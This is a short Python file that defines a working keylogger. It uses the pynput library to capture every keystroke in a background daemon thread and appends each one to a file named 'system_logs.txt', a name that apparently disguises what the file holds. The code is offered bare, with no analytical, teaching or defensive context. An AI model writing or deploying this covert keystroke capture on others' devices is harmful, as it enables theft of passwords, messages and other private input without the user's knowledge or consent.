from pynput import keyboard

def start_keylogger() -> None:
    def on_press(key):
        try: 
            k = str(key.char)
        except AttributeError: 
            k = f" [{key}] "
        
        with open("system_logs.txt", "a", encoding="utf-8") as f:
            f.write(k)
            
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()